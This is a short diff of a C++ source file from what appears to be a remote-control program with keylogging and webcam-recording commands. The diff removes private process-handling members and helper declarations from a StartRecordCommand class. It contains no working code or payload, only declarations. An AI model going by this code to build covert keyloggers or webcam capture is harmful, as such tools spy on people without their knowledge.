@@ -145,11 +145,6 @@ class StopKeylogCommand : public Command{
 };
 
 class StartRecordCommand : public Command{
-private:
-    PROCESS_INFORMATION recordingProcess = { 0 };
-    HANDLE hStdInWrite = NULL;
-    PROCESS_INFORMATION startRecording(const std::string& webcamName, HANDLE& hStdInWrite);
-    int record();
 public:
     void execute(Server& server, const std::string& param) override;
 };
